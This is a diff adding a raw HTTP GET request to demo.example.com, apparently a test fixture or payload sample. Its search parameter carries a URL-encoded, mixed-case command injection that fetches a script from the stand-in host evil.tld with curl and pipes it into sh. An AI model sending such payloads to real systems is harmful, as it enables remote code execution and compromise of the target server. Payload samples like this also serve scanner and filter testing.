@@ -1,0 +1,4 @@
+GET /a?search=cUrL%20hTtP://eViL.tLd/I.sH%20|%20sH HTTP/1.1
+Host: demo.example.com
+Connection: close
+
